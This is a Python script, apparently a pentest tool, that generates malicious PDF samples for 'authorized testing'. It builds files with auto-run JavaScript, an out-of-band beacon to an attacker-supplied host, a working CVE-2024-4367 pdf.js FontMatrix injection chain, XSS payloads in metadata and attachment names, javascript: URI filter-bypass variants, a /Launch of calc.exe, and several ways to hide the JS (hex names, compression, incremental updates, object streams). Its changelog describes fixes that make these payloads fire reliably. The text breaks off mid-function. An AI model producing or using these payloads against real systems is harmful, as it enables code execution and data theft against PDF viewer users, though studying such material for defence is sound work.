# -*- coding: utf-8 -*-
"""
PDF XSS 测试样本生成器 v6（v5 重构修复版）
仅供授权安全测试使用 | 要求 Python 3.7+

v5 → v6 修复清单：
  [P0-1] 修复 3 处 bytes 字面量含中文导致的 SyntaxError（原 L319/L587/L627），
         脚本在 Python 3 下根本无法运行；Python 2 下 f-string 报错 —— v6 明确仅支持 Python 3
  [P0-2] 重写字符串编码层：
         - pdf_escape 严格限定 Latin-1（v5 的 \\%03o 对码点>0o777 产生超 3 位八进制，
           违反 PDF 词法规则"\\ 后最多 3 位八进制"，中文载荷全部乱码）
         - 新增 pdf_utf16（UTF-16BE+BOM 十六进制串，PDF 标准 Unicode 文本串编码）
         - 新增 pdf_text 自动选择编码；pdf_hex 不再 errors="replace" 静默降级
         - 新增 js_ascii：JS 源码流内容转纯 ASCII（\\uXXXX），修复压缩流载荷乱码
  [P0-3] pdf_name_escape 实现 force_all 形参（v5 中 gen_18adv 传参即 TypeError）；
         v5 gen_08 宣称"/S /JS 都混淆"实际从未发生（普通字母不触发转义），v6 真正全量编码
  [P1-1] gen_02 OOB 载荷去 DOM 化：v5 使用 document.cookie/btoa（浏览器 API，
         AcroJS 环境不存在），实参求值即抛 ReferenceError 且被空 catch 吞掉，
         app.launchURL 永不执行 → OOB 零流量；v6 仅用 AcroJS 原生 API，
         失败时显式弹框暴露原因
  [P1-2] gen_04 按官方披露（Codean Labs）重写 CVE-2024-4367 触发链：
         v5 的 /FontMatrix 是标准值（注入点缺失）+ 恶意代码放在 CharProcs 里用
         "cvx exec" 执行（PostScript 原语，PDF 内容流非法，任何渲染器都拒绝）；
         v6 内嵌不含内部 FontMatrix 的最小 Type1 字体，把载荷作为 FontMatrix
         数组的字符串元素注入（pdf.js 将其不带引号拼入 new Function 函数体）
  [P1-3] PDFBuilder.build 新增 trailer_extra 参数：v5 的 trailer 硬编码 /Size /Root，
         gen_11 把 /Info 挂在 Catalog 的 /Info 键（无效键，规范要求 trailer 引用），
         "修正 Info 字典"的宣称未达成；v6 将 /Info 正确写入 trailer
  [P2-1] gen_07 补 /CO 计算顺序数组（v5 的 /C calculate 动作未列入，触发不可靠）
  [P2-2] gen_16 XRef 流 W 由 [1 2 2] 改 [1 4 2]（v5 偏移字段仅 2 字节，文件 >64KB 溢出），
         修正错误注释（"Field1: 3字节"实为 2 字节），自由对象头 field2 按惯例置 65535
  [P2-3] gen_18adv 删除 /DecodeParams /Predictor 12 干扰（v5 中它要求解压后做
         PNG Up 行滤波反变换而数据未按预测器编码 → 解出的 JS 为乱码，
         "保证正确解压"的宣称不成立）；该函数 v5 中未被调用（死代码），v6 纳入主流程
  [P2-4] gen_14 标注 percent 编码变体的真实用途：PDF URI 动作不做 percent 解码，
         'java%73cript'/'javascript%3A' 不会真实执行，仅用于探测过滤器解码行为
  [P3]   移除 build() 死参数 incremental（从未被任何调用方使用）

CVE-2024-4367 参考版本信息（Codean Labs 官方披露）：
  - 修复版本：pdf.js v4.2.67（2024-04-29）；Firefox 126 / ESR 115.11 / Thunderbird 115.11
  - 缓解措施：isEvalSupported=false 或 CSP 禁用 eval/Function
"""

import os
import zlib
import struct

OUT_DIR = "xss_samples_v6"
os.makedirs(OUT_DIR, exist_ok=True)


# ===============================================================
# 底层编码层（v6 重写）
# ===============================================================

def pdf_escape(s: str) -> bytes:
    """PDF 字面字符串转义（仅限 Latin-1 范围）

    v5 缺陷："\\%03o" % code 对码点 > 0o777(511) 的字符产生超过 3 位的八进制，
    而 PDF 词法规定反斜杠后最多读 3 位八进制 —— 中文载荷全部乱码。
    v6：127~255 用八进制转义，>0xFF 直接抛错（调用方应改用 pdf_text/pdf_utf16）。
    """
    out = []
    for ch in s:
        code = ord(ch)
        if ch in ("(", ")", "\\"):
            out.append("\\" + ch)
        elif ch == "\n":
            out.append("\\n")
        elif ch == "\r":
            out.append("\\r")
        elif code < 32 or (126 < code <= 0xFF):
            out.append("\\%03o" % code)
        elif code > 0xFF:
            raise ValueError("非 Latin-1 字符 %r：请改用 pdf_text()（UTF-16BE）" % ch)
        else:
            out.append(ch)
    return b"(" + "".join(out).encode("latin-1") + b")"


def pdf_utf16(s: str) -> bytes:
    """UTF-16BE + BOM 十六进制字符串：PDF 标准的 Unicode 文本串编码"""
    data = b"\xfe\xff" + s.encode("utf-16-be")
    return b"<" + data.hex().upper().encode("ascii") + b">"


def pdf_text(s: str) -> bytes:
    """自动编码选择：Latin-1 内用字面串（可读性/混淆度低），否则 UTF-16BE 十六进制串"""
    if all(ord(c) <= 0xFF for c in s):
        return pdf_escape(s)
    return pdf_utf16(s)


def pdf_hex(s: str) -> bytes:
    """PDF 十六进制字符串（仅 Latin-1）

    v5 缺陷：encode(errors="replace") 把非 Latin-1 字符静默替换为 '?'，
    gen_09 载荷实际弹出 'JS??????'；v6 抛错阻止静默降级。
    """
    try:
        data = s.encode("latin-1")
    except UnicodeEncodeError:
        raise ValueError("含非 Latin-1 字符：请改用 pdf_utf16()")
    return b"<" + data.hex().upper().encode("ascii") + b">"


def js_ascii(s: str) -> str:
    """JS 源码 ASCII 化：非 ASCII 字符转 \\uXXXX 转义（用于流内的 JS 源码）"""
    return "".join(c if ord(c) < 128 else "\\u%04x" % ord(c) for c in s)


def pdf_name_escape(s: str, force_all: bool = False) -> bytes:
    """Name 对象 #xx 混淆

    v5 缺陷：
      1. 无 force_all 形参，但 gen_18adv 以 force_all=True 调用 → TypeError
      2. 普通字母（A-Z/a-z）从不触发转义条件 → gen_08 宣称的
         "/S 和 /JS 都混淆"实际输出仍是 /S 与 /JS（虚假宣称）
    v6：force_all=True 时全量 #xx 编码；Name 仅允许 ASCII（超界抛错）。
    """
    if not s.isascii():
        raise ValueError("PDF Name 仅允许 ASCII 字符")
    out = []
    for ch in s:
        code = ord(ch)
        if force_all or code < 33 or code > 126 or ch in ("#", "/"):
            out.append("#%02x" % code)
        else:
            out.append(ch)
    return b"/" + "".join(out).encode("latin-1")


def flate(data: bytes) -> bytes:
    return zlib.compress(data, 9)


# ===============================================================
# 构建层
# ===============================================================

class PDFBuilder:
    """支持普通对象、流对象、xref 自动构建"""

    def __init__(self):
        self.objects = {}  # num -> bytes

    def add_object(self, num: int, body: bytes):
        self.objects[num] = body

    def add_stream(self, num: int, dict_extra: bytes, data: bytes, compress=True):
        payload = flate(data) if compress else data
        filt = b"/Filter /FlateDecode " if compress else b""
        header = (b"<< " + filt + b"/Length " + str(len(payload)).encode() +
                  b" " + dict_extra + b" >>")
        self.objects[num] = header + b"\nstream\n" + payload + b"\nendstream"

    def build(self, root_num: int = 1, trailer_extra: bytes = b"") -> bytes:
        """构建完整 PDF

        v5 缺陷：trailer 硬编码只含 /Size /Root，无法携带 /Info 等附加键
        （gen_11 的 Info 字典修复因此落空）；死参数 incremental 从未被使用。
        v6：新增 trailer_extra；移除死参数。
        """
        out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
        offsets = {}
        for num in sorted(self.objects):
            offsets[num] = len(out)
            out += b"%d 0 obj\n" % num + self.objects[num] + b"\nendobj\n"
        xref_pos = len(out)
        maxnum = max(self.objects)
        out += b"xref\n0 %d\n" % (maxnum + 1)
        out += b"0000000000 65535 f \n"
        for i in range(1, maxnum + 1):
            if i in offsets:
                out += b"%010d 00000 n \n" % offsets[i]
            else:
                out += b"0000000000 65535 f \n"
        out += (b"trailer\n<< /Size %d /Root %d 0 R " % (maxnum + 1, root_num) +
                trailer_extra + b">>\nstartxref\n%d\n%%%%EOF\n" % xref_pos)
        return bytes(out)


def save(filename: str, data: bytes, desc: str):
    path = os.path.join(OUT_DIR, filename)
    with open(path, "wb") as f:
        f.write(data)
    print("  [+] %-42s | %s" % (filename, desc))


JS_ALERT = "app.alert('PDF XSS: ' + app.viewerType);"


# ===============================================================
# 最小 Type1 字体构造（gen_04 专用）
# ===============================================================

def _t1_encrypt(plain: bytes, key: int, n_lead: int = 4) -> bytes:
    """Type1 加密（eexec 密钥 55665 / charstring 密钥 4330），前导 n_lead 字节随机噪声"""
    data = bytes([0x5A, 0xA5, 0x37, 0x7E][:n_lead]) + plain
    r = key
    out = bytearray()
    for b in data:
        c = b ^ (r >> 8)
        r = ((c + r) * 52845 + 22719) & 0xFFFF
        out.append(c)
    return bytes(out)


def build_type1_font() -> bytes:
    """构造最小 Type1 字体（二进制 Type1 段）

    CVE-2024-4367 的触发前提：字体头部【不含】/FontMatrix ——
    这样 PDF 字体字典层的 /FontMatrix 才是权威值，pdf.js 会把它传入
    字形编译链（compileGlyph → new Function 函数体拼接）。
    若字体内部声明了 /FontMatrix，会覆盖 PDF 层的值，注入失效。
    """
    # 字形 /A：绘制 60x60 方块。Type1 charstring 编码：v∈[-107,107] → 字节 v+139
    glyph_a = bytes([
        139, 239, 13,      # 0 100 hsbw（侧轴承 0，字宽 100）
        139, 139, 21,      # 0 0 rmoveto
        199, 139, 5,       # 60 0 rlineto
        139, 199, 5,       # 0 60 rlineto
        79, 139, 5,        # -60 0 rlineto
        9,                 # closepath
        14,                # endchar
    ])
    glyph_notdef = bytes([139, 239, 13, 14])  # 0 100 hsbw endchar

    charstrings = [(b".notdef", glyph_notdef), (b"A", glyph_a)]

    # eexec 明文体（Private 字典 + CharStrings）
    body = bytearray()
    body += b"dup /Private 8 dict dup begin\n"
    body += b"/RD {string currentfile exch readstring pop} executeonly def\n"
    body += b"/ND {noaccess def} executeonly def\n"
    body += b"/BlueValues [] def\n"
    body += b"/MinFeature {16 16} def\n"
    body += b"/password 5839 def\n"
    body += b"/Subrs 0 array\n"
    body += b"ND\n"
    body += b"2 index /CharStrings %d dict dup begin\n" % len(charstrings)
    for name, ops in charstrings:
        enc = _t1_encrypt(ops, 4330, 4)
        body += b"/" + name + b" %d RD " % len(enc) + enc + b" ND\n"
    body += b"end\n"
    body += b"end\n"
    body += b"readonly put\n"
    body += b"noaccess put\n"
    body += b"dup /FontName get exch definefont pop\n"
    body += b"mark currentfile closefile\n"

    eexec = _t1_encrypt(bytes(body), 55665, 4)

    # 注意：头部刻意【不写】/FontMatrix（见 docstring）
    header = (
        b"%!PS-AdobeFont-1.0: MinimalFont 001.001\n"
        b"/FontName /MinimalFont def\n"
        b"/PaintType 0 def\n"
        b"/FontType 1 def\n"
        b"/FontBBox {0 0 1000 1000} readonly def\n"
        b"/Encoding 256 array\n"
        b"0 1 255 {1 index exch /.notdef put} for\n"
        b"dup 65 /A put\n"
        b"readonly def\n"
        b"currentdict end\n"
        b"currentfile eexec\n"
    )
    # 512 个 '0' 是 Type1 规范的 eexec 段结束标记
    return header + eexec + b"\n" + b"0" * 512 + b"\ncleartomark\n"


# ===============================================================
# 01 /OpenAction + AcroJS 弹框
# ===============================================================
def gen_01_openaction_alert():
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
    pdf.add_object(4, b"<< /S /JavaScript /JS " + pdf_text(JS_ALERT) + b" >>")
    save("01_openaction_alert.pdf", pdf.build(), "OpenAction AcroJS 弹框")


# ===============================================================
# 02 /OpenAction + OOB 外带
# ===============================================================
def gen_02_openaction_exfil(oob: str):
    """v5 缺陷：载荷使用 document.cookie / btoa（浏览器 DOM/Worker API，
    AcroJS 环境不存在）。JS 实参先于函数调用求值，document 引用直接抛
    ReferenceError 并被空 catch 吞掉 → app.launchURL 永不执行，OOB 零流量。
    v6：仅用 AcroJS 原生 API；失败时显式弹框暴露原因，避免静默失败误导结论。
    """
    js = ("var d='v='+app.viewerType+'-'+app.viewerVersion;"
          "try{app.launchURL('%s/xss?d='+d,true);}"
          "catch(e){app.alert('OOB failed: '+e);}" % oob)
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
    pdf.add_object(4, b"<< /S /JavaScript /JS " + pdf_text(js) + b" >>")
    save("02_openaction_exfil.pdf", pdf.build(), "OpenAction OOB 数据外带")


# ===============================================================
# 03 URI 动作 javascript: 伪协议
# ===============================================================
def gen_03_uri_javascript():
    # 预期说明：依赖查看器把 javascript: URI 委托给浏览器执行（历史上 Chrome/Edge
    # 的 PDF 插件会），document.domain 在浏览器上下文中才有值；现代阅读器多默认拦截
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
    pdf.add_object(4, b"<< /S /URI /URI (javascript:alert(document.domain)) >>")
    save("03_uri_javascript.pdf", pdf.build(), "URI 动作 javascript: 伪协议")


# ===============================================================
# 04 pdf.js FontMatrix 注入（CVE-2024-4367，按官方披露重写）
# ===============================================================
JS_FONTMATRIX = "0); alert('PDF XSS: ' + window.origin"


def gen_04_pdfjs_fontmatrix(payload: str = None):
    """pdf.js CVE-2024-4367：FontMatrix 注入 → 任意 JavaScript 执行

    v5 两项致命错误：
      1. /FontMatrix 用标准值 [0.001 0 0 0.001 0 0]，注入点完全缺失 ——
         CVE 在任何 pdf.js 版本上都无从触发
      2. 恶意代码放在 CharProcs 流中用 "<<...>> cvx exec" 执行：cvx/exec/
         字典构造是 PostScript 程序原语而非 PDF 内容流操作符，任何渲染器
         都会报 unknown operator（且 "<<" 在内容流中本身是词法错误）

    v6 按官方披露（Codean Labs, 2024-05-20）复刻触发链：
      pdf.js 将字形绘制指令预编译为 new Function("c","size", body)，body 由
      cmds 拼接，其中包含 c.transform(<FontMatrix 六元素 join(",")>)。
      FontMatrix 中的【字符串元素】会不带引号原样插入函数体：
        /FontMatrix [1 2 3 4 5 (0\\); alert\\('...')]
      生成 → c.transform(1,2,3,4,5,0); alert('...');
      （载荷以 "0);" 开头先闭合 transform 调用；末尾不闭合括号，
       由拼接自动追加的 ");" 收尾 —— 与官方 PoC 完全一致的语法策略）

    触发前提（缺一不可）：
      a. 页面内容流实际渲染该字体的字形（Tj → compileGlyph → new Function）
      b. 内嵌 Type1 字体头部不含 /FontMatrix（否则字体内部值覆盖 PDF 层值）
      c. pdf.js 未设 isEvalSupported=false，且 CSP 未禁用 eval/Function
    受影响版本：pdf.js < 4.2.67（2024-04-29 修复）；
                Firefox < 126 / ESR < 115.11 / Thunderbird < 115.11
    """
    payload = payload if payload is not None else JS_FONTMATRIX
    font = build_type1_font()

    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3,
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        b"/Resources << /Font << /F1 4 0 R >> >> /Contents 7 0 R >>")
    # 前 5 个元素为正常数值，第 6 个元素是载荷字符串（括号转义由 pdf_escape 处理）
    pdf.add_object(4,
        b"<< /Type /Font /Subtype /Type1 /BaseFont /MinimalFont "
        b"/FirstChar 65 /LastChar 65 /Widths [1000] "
        b"/FontDescriptor 5 0 R "
        b"/FontMatrix [1 2 3 4 5 " + pdf_escape(payload) + b"] >>")
    pdf.add_object(5,
        b"<< /Type /FontDescriptor /FontName /MinimalFont /Flags 4 "
        b"/FontBBox [0 0 1000 1000] /ItalicAngle 0 /Ascent 800 /Descent -200 "
        b"/CapHeight 700 /StemV 80 /FontFile 6 0 R >>")
    pdf.add_stream(6, b"", font, compress=False)
    pdf.add_stream(7, b"", b"BT /F1 24 Tf 72 700 Td (A) Tj ET", compress=False)
    save("04_pdfjs_cve_2024_4367.pdf", pdf.build(),
         "pdf.js CVE-2024-4367 FontMatrix 注入（内嵌无 FontMatrix 的 Type1 字体）")


# ===============================================================
# 05 /AA 页面附加动作
# ===============================================================
def gen_05_page_aa():
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3,
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        b"/AA << /O 4 0 R /C 5 0 R >> >>")
    pdf.add_object(4, b"<< /S /JavaScript /JS " + pdf_text("app.alert('AA /O');") + b" >>")
    pdf.add_object(5, b"<< /S /JavaScript /JS " + pdf_text("app.alert('AA /C');") + b" >>")
    save("05_page_aa.pdf", pdf.build(), "/AA 页面打开/关闭触发")


# ===============================================================
# 06 注解触发
# ===============================================================
def gen_06_annotation():
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3,
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [4 0 R] >>")
    pdf.add_object(4,
        b"<< /Type /Annot /Subtype /Link /Rect [100 600 300 650] /Border [0 0 0] "
        b"/A << /S /JavaScript /JS " + pdf_text("app.alert('点击触发');") + b" >> "
        b"/AA << /E << /S /JavaScript /JS " + pdf_text("app.alert('悬停触发');") + b" >> >> >>")
    save("06_annotation_action.pdf", pdf.build(), "注解点击+悬停触发")


# ===============================================================
# 07 AcroForm 表单事件
# ===============================================================
def gen_07_acroform():
    # v5 缺陷：字段 /AA /C（calculate）动作未列入 AcroForm 的 /CO 计算顺序数组，
    # 阅读器不会把它纳入计算链，触发不可靠；v6 补 /CO [4 0 R]
    pdf = PDFBuilder()
    pdf.add_object(1,
        b"<< /Type /Catalog /Pages 2 0 R "
        b"/AcroForm << /Fields [4 0 R] /CO [4 0 R] /NeedAppearances true >> >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3,
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [4 0 R] >>")
    js = pdf_text("app.alert('表单事件');")
    pdf.add_object(4,
        b"<< /Type /Annot /Subtype /Widget /FT /Tx /T (field1) "
        b"/Rect [100 600 300 630] "
        b"/AA << /V << /S /JavaScript /JS " + js + b" >> "
        b"/K << /S /JavaScript /JS " + js + b" >> "
        b"/F << /S /JavaScript /JS " + js + b" >> "
        b"/C << /S /JavaScript /JS " + js + b" >> >> >>")
    save("07_acroform_events.pdf", pdf.build(), "AcroForm 表单字段事件（含 /CO 计算链）")


# ===============================================================
# 08 Name 对象十六进制混淆（v6 真正全量编码）
# ===============================================================
def gen_08_hex_name_obfuscation():
    # v5 缺陷：pdf_name_escape 无 force_all 参数且普通字母不转义，
    # /S 与 /JS 实际原样输出，"彻底混淆"为虚假宣称；v6 全量 #xx 编码：
    #   /S → /#53   /JavaScript → /#4a#61#76#61#53#63#72#69#70#74   /JS → /#4a#53
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
    s_obf = pdf_name_escape("S", force_all=True)
    js_name_obf = pdf_name_escape("JavaScript", force_all=True)
    js_key_obf = pdf_name_escape("JS", force_all=True)
    pdf.add_object(4,
        b"<< " + s_obf + b" " + js_name_obf + b" " + js_key_obf + b" " +
        pdf_text("app.alert('Name混淆成功');") + b" >>")
    save("08_hex_name_obfuscation.pdf", pdf.build(), "Name 对象 #xx 混淆（/S /JavaScript /JS 全量编码）")


# ===============================================================
# 09 /JS 十六进制字符串编码
# ===============================================================
def gen_09_hex_string_js():
    # v5 缺陷：pdf_hex 的 errors="replace" 把中文静默替换为 '?'，
    # 载荷实际为 app.alert('JS??????')；v6 走 UTF-16BE+BOM 十六进制串，
    # 阅读器按 BOM 正确识别 Unicode
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
    pdf.add_object(4,
        b"<< /S /JavaScript /JS " + pdf_utf16("app.alert('JS十六进制编码');") + b" >>")
    save("09_hex_string_js.pdf", pdf.build(), "/JS 十六进制字符串编码（UTF-16BE）")


# ===============================================================
# 10 FlateDecode 压缩隐藏
# ===============================================================
def gen_10_flate_hidden():
    # v5 缺陷：bytes 字面量含中文 → SyntaxError（脚本无法运行）；
    # v6：JS 源码经 js_ascii() 转纯 ASCII（\uXXXX 转义）再入流
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
    pdf.add_object(4, b"<< /S /JavaScript /JS 5 0 R >>")
    js_code = js_ascii("app.alert('FlateDecode隐藏的JS代码执行成功');").encode("ascii")
    pdf.add_stream(5, b"", js_code, compress=True)
    save("10_flate_hidden_action.pdf", pdf.build(),
         "FlateDecode 压缩隐藏动作（间接对象引用）")


# ===============================================================
# 11 元数据注入（v6：/Info 正确进入 trailer）
# ===============================================================
def gen_11_metadata_injection():
    # v5 缺陷：/Info 挂在 Catalog 的 /Info 键上 —— 无效键（规范要求由 trailer
    # 引用 Info 字典），而 build() 的 trailer 硬编码 → 标准阅读器不识别，
    # "修正 Info 字典"未达成；v6 通过 trailer_extra 把 /Info 写入 trailer
    xss = "\"><img src=x onerror=alert(document.domain)>"
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /Metadata 5 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
    pdf.add_object(4,
        b"<< /Title " + pdf_text(xss) +
        b" /Author " + pdf_text("<svg onload=alert(origin)>") +
        b" >>")
    xmp = ('<?xpacket begin="" id="W5M0MpCehiHzreSzNTczkc9d"?>'
           '<x:xmpmeta xmlns:x="adobe:ns:meta/">'
           '<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">'
           '<rdf:Description><dc:title xmlns:dc="http://purl.org/dc/elements/1.1/">'
           '<rdf:Alt><rdf:li xml:lang="x-default">'
           + xss +
           '</rdf:li></rdf:Alt></dc:title></rdf:Description>'
           '</rdf:RDF></x:xmpmeta>'
           '<?xpacket end="w"?>').encode()
    pdf.add_stream(5, b"/Type /Metadata /Subtype /XML", xmp, compress=False)
    save("11_metadata_injection.pdf", pdf.build(trailer_extra=b"/Info 4 0 R "),
         "Info/XMP 元数据注入（/Info 挂 trailer）")


# ===============================================================
# 12 附件名注入
# ===============================================================
def gen_12_embedded_filename():
    evil_name = "\"><img src=x onerror=alert(document.domain)>.txt"
    pdf = PDFBuilder()
    pdf.add_object(1,
        b"<< /Type /Catalog /Pages 2 0 R "
        b"/Names << /EmbeddedFiles << /Names [" + pdf_escape(evil_name) + b" 4 0 R] >> >> >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
    pdf.add_object(4,
        b"<< /Type /Filespec /F " + pdf_escape(evil_name) +
        b" /UF " + pdf_escape(evil_name) +
        b" /EF << /F 5 0 R >> >>")
    pdf.add_stream(5, b"/Type /EmbeddedFile", b"content", compress=False)
    save("12_embedded_filename.pdf", pdf.build(), "嵌入附件文件名注入")


# ===============================================================
# 13 /Launch 动作
# ===============================================================
def gen_13_launch_action():
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
    pdf.add_object(4, b"<< /S /Launch /F (calc.exe) >>")
    save("13_launch_action.pdf", pdf.build(), "/Launch 动作（现代阅读器默认拦截/强提示）")


# ===============================================================
# 14 URI 协议混淆变体
# ===============================================================
def gen_14_uri_variants():
    """URI 协议混淆变体 ×7

    评估注意：'java%73cript' 与 'javascript%3A' 两条【不会真实执行】——
    PDF URI 动作不做 percent 解码，仅把字面串交给查看器/浏览器。
    其价值在于探测目标过滤器的解码行为（是否先做 percent 解码再匹配
    黑名单）：返回结果需区分"载荷执行"与"过滤器被绕过"两种结论。
    """
    variants = [
        ("raw", b"(javascript:alert('raw'))"),
        ("tab", b"(java\\tscript:alert('tab'))"),
        ("newline", b"(java\\nscript:alert('newline'))"),
        ("percent", b"(java%73cript:alert('percent'))"),   # %73 = s（仅探测过滤器）
        ("mixed-case", b"(JaVaScRiPt:alert('mixed'))"),
        ("data-uri", b"(data:text/html,<script>alert('data')</script>)"),
        ("url-encoded-colon", b"(javascript%3Aalert('colon'))"),  # %3A = :（仅探测过滤器）
    ]
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    annot_refs = []
    num = 4
    y = 700
    for label, uri in variants:
        pdf.add_object(num,
            b"<< /Type /Annot /Subtype /Link /Rect [100 %d 500 %d] "
            b"/Border [0 0 0] /A << /S /URI /URI %s >> >>" % (y, y + 25, uri))
        annot_refs.append(b"%d 0 R" % num)
        num += 1
        y -= 40
    pdf.add_object(3,
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        b"/Annots [" + b" ".join(annot_refs) + b"] >>")
    save("14_uri_variants.pdf", pdf.build(), "URI 协议混淆变体 ×7（percent 变体仅作过滤器探测）")


# ===============================================================
# 15 增量更新隐藏恶意对象
# ===============================================================
def gen_15_incremental_update():
    # v5 实现正确（子表 xref + /Prev 链 + 偏移计算），v6 保留并统一载荷编码
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")
    clean = pdf.build()

    # 原始 xref 位置（增量段 /Prev 指向它）
    prev_pos = int(clean.rsplit(b"startxref", 1)[-1].strip().split(b"\n")[0])

    # 增量段：重定义对象 1（追加 /OpenAction）+ 新增对象 4（JS 动作）
    inc = bytearray()
    off1 = len(clean) + len(inc)
    inc += (b"1 0 obj\n"
            b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\n"
            b"endobj\n")
    off4 = len(clean) + len(inc)
    inc += (b"4 0 obj\n"
            b"<< /S /JavaScript /JS " +
            pdf_text("app.alert('增量更新');") + b" >>\n"
            b"endobj\n")
    xref_pos = len(clean) + len(inc)

    # 子表形式 xref（支持非连续对象号）
    inc += b"xref\n"
    inc += b"1 1\n"
    inc += b"%010d 00000 n \n" % off1
    inc += b"4 1\n"
    inc += b"%010d 00000 n \n" % off4
    inc += (b"trailer\n<< /Size 5 /Root 1 0 R /Prev %d >>\n"
            b"startxref\n%d\n%%%%EOF\n" % (prev_pos, xref_pos))

    save("15_incremental_update.pdf", clean + bytes(inc), "增量更新隐藏恶意 OpenAction")


# ===============================================================
# 16 对象流隐藏（标准 XRef Stream 实现）
# ===============================================================
def gen_16_objstm_hidden():
    """对象流 /ObjStm 隐藏 JS 动作 —— 标准 XRef Stream 实现

    v5 缺陷：
      1. W [1 2 2] 的偏移字段仅 2 字节 → 文件超过 64KB 即溢出（非通用实现）
      2. 注释写"Field1: 3字节"与实际代码 2 字节不符
      3. 自由对象头 field2 未按惯例置 65535
    v6：W [1 4 2]（偏移 4 字节，支持 >64KB），修正注释与自由头条目。
    """
    pdf = PDFBuilder()
    pdf.add_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>")
    pdf.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    pdf.add_object(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>")

    # 对象 4（JS 动作字典）将压入 ObjStm 5 —— 不直接写入文件
    js_dict = b"<< /S /JavaScript /JS " + pdf_text("app.alert('ObjStm标准XRef流隐藏');") + b" >>"

    # ObjStm 头部为 (对象号 相对偏移) 对；/First = 首个对象数据的起始偏移
    header = b"4 0 "
    pdf.add_stream(5, b"/Type /ObjStm /N 1 /First " + str(len(header)).encode(),
                   header + js_dict, compress=True)

    out = bytearray(b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n")
    offsets = {}

    # 常规对象 1, 2, 3, 5（对象 4 在 ObjStm 内，无独立偏移）
    for num in (1, 2, 3, 5):
        offsets[num] = len(out)
        out += b"%d 0 obj\n" % num + pdf.objects[num] + b"\nendobj\n"

    xref_pos = len(out)
    offsets[6] = xref_pos

    # W [1 4 2]：Type 1 字节 / Field1 4 字节 / Field2 2 字节
    #   type 1：Field1=字节偏移，Field2=生成号
    #   type 2：Field1=所在对象流号，Field2=流内索引
    def pack_entry(typ, field1, field2):
        return bytes([typ]) + struct.pack(">I", field1) + struct.pack(">H", field2)

    xref_entries = [
